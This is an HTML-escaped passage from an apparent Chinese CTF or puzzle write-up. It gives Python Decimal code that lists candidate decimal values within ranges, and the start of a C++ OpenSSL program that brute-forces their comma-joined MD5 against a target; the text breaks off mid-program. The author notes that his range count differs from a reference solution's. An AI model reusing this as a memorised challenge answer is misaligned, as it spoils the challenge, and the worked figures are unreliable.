&lt;tr&gt;
&lt;td&gt;$41050$&lt;/td&gt;
&lt;td&gt;$54.00025$&lt;/td&gt;
&lt;td&gt;$17705$&lt;/td&gt;
&lt;td&gt;$54.09785$&lt;/td&gt;
&lt;td&gt;$17737$&lt;/td&gt;
&lt;td&gt;$0.00305$&lt;/td&gt;
&lt;td&gt;$0.00305$&lt;/td&gt;
&lt;td&gt;$7$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;$41051$&lt;/td&gt;
&lt;td&gt;$158.0031$&lt;/td&gt;
&lt;td&gt;$10327$&lt;/td&gt;
&lt;td&gt;$158.0949$&lt;/td&gt;
&lt;td&gt;$10333$&lt;/td&gt;
&lt;td&gt;$0.0153$&lt;/td&gt;
&lt;td&gt;$0.0153$&lt;/td&gt;
&lt;td&gt;$6$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;$41052$&lt;/td&gt;
&lt;td&gt;$22.0027$&lt;/td&gt;
&lt;td&gt;$7214$&lt;/td&gt;
&lt;td&gt;$22.09725$&lt;/td&gt;
&lt;td&gt;$7245$&lt;/td&gt;
&lt;td&gt;$0.00305$&lt;/td&gt;
&lt;td&gt;$0.00305$&lt;/td&gt;
&lt;td&gt;$4$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;$41053$&lt;/td&gt;
&lt;td&gt;$13.1121$&lt;/td&gt;
&lt;td&gt;$857$&lt;/td&gt;
&lt;td&gt;$13.1886$&lt;/td&gt;
&lt;td&gt;$862$&lt;/td&gt;
&lt;td&gt;$0.0153$&lt;/td&gt;
&lt;td&gt;$0.0153$&lt;/td&gt;
&lt;td&gt;$5$&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;接下来在这一范围内进行爆破就好了&lt;/p&gt;
&lt;p&gt;对范围做了个计算，我搞出来的是 2028571776，不知道为什么参考比我这个小一点&lt;/p&gt;
&lt;h3 id=&#34;爆破&#34;&gt;爆破&lt;/h3&gt;
&lt;p&gt;因为最后要算 md5，所以精度不能有问题，又因为爆破范围大概在 20 亿左右，所以速度也不能慢&lt;/p&gt;
&lt;p&gt;于是决定先用python的Decimal来算小数，再用cpp求解&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; decimal &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; Decimal

min &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;52.8016&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;25.0002&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;62.10105&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;406.6128&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;54.00025&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;158.0031&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;22.0027&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;13.1121&lt;/span&gt;]
max &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;52.8992&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;25.092&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;62.19865&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;406.6893&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;54.09785&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;158.0949&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;22.09725&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;13.1886&lt;/span&gt;]
dif &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;0.00305&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0.0153&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0.00305&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0.0153&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0.00305&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0.0153&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0.00305&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0.0153&lt;/span&gt;]
round &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;]
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;):
    min[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; str(min[i])
    max[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; str(max[i])
    dif[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; str(dif[i])
    res &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; min[i]
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _ &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(round[i]):
        print (res, end &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;, &amp;#39;&lt;/span&gt;)
        res &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Decimal(res) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; Decimal(dif[i])
    print ()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;最后算出来的结尾会有0，手动去除一下就行&lt;/p&gt;
&lt;p&gt;然后用cpp进行爆破，这里写的比较懒&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#pragma GCC optimize(3)
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;bits/stdc++.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;openssl/md5.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;using&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;namespace&lt;/span&gt; std;

string combine[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;][&lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
    {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;62.10105&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;62.1041&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;62.10715&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;62.1102&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;62.11325&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;62.1163&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;62.11935&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;62.1224&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;62.12545&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;62.1285&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;62.13155&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;62.1346&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;62.13765&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;62.1407&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;62.14375&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;62.1468&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;62.14985&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;62.1529&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;62.15595&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;62.1590&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;62.16205&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;62.1651&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;62.16815&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;62.1712&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;62.17425&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;62.1773&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;62.18035&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;62.1834&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;62.18645&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;62.1895&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;62.19255&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;62.1956&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;62.19865&amp;#34;&lt;/span&gt;},
    {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;25.0002&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;25.0155&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;25.0308&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;25.0461&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;25.0614&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;25.0767&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;25.092&amp;#34;&lt;/span&gt;},
    {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;52.8016&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;52.80465&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;52.8077&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;52.81075&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;52.8138&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;52.81685&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;52.8199&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;52.82295&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;52.8260&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;52.82905&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;52.8321&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;52.83515&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;52.8382&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;52.84125&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;52.8443&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;52.84735&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;52.8504&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;52.85345&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;52.8565&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;52.85955&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;52.8626&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;52.86565&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;52.8687&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;52.87175&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;52.8748&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;52.87785&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;52.8809&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;52.88395&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;52.8870&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;52.89005&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;52.8931&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;52.89615&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;52.8992&amp;#34;&lt;/span&gt;},
    {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;406.6128&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;406.6281&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;406.6434&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;406.6587&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;406.674&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;406.6893&amp;#34;&lt;/span&gt;},
    {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;22.0027&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;22.00575&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;22.0088&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;22.01185&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;22.0149&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;22.01795&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;22.0210&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;22.02405&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;22.0271&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;22.03015&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;22.0332&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;22.03625&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;22.0393&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;22.04235&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;22.0454&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;22.04845&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;22.0515&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;22.05455&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;22.0576&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;22.06065&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;22.0637&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;22.06675&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;22.0698&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;22.07285&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;22.0759&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;22.07895&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;22.0820&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;22.08505&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;22.0881&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;22.09115&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;22.0942&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;22.09725&amp;#34;&lt;/span&gt;},
    {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;13.1121&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;13.1274&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;13.1427&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;13.158&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;13.1733&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;13.1886&amp;#34;&lt;/span&gt;},
    {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;158.0031&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;158.0184&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;158.0337&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;158.049&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;158.0643&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;158.0796&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;158.0949&amp;#34;&lt;/span&gt;},
    {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;54.00025&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;54.0033&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;54.00635&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;54.0094&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;54.01245&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;54.0155&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;54.01855&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;54.0216&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;54.02465&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;54.0277&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;54.03075&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;54.0338&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;54.03685&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;54.0399&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;54.04295&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;54.0460&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;54.04905&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;54.0521&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;54.05515&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;54.0582&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;54.06125&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;54.0643&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;54.06735&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;54.0704&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;54.07345&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;54.0765&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;54.07955&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;54.0826&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;54.08565&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;54.0887&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;54.09175&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;54.0948&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;54.09785&amp;#34;&lt;/span&gt;},
};

&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; size[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;};

string &lt;span style=&#34;color:#a6e22e&#34;&gt;MD5&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; string&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; src )
{
    MD5_CTX ctx;

    string md5_string;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; md[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; { &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; };
    &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; tmp[&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; { &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; };

    MD5_Init( &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;ctx );
    MD5_Update( &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;ctx, src.c_str(), src.size() );
    MD5_Final( md, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;ctx );

    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;( &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i )
    {   
        memset( tmp, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;( tmp ) );
        sprintf( tmp, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%02X&amp;#34;&lt;/span&gt;, md[i] );
        md5_string &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; tmp;
    }   
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; md5_string;
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(){
    cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; MD5(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;62.10105,25.0002,52.8016,406.6128,22.0027,13.1121,158.0031,54.00025,&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; endl;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; cur[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {};
    time_t start &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; clock();
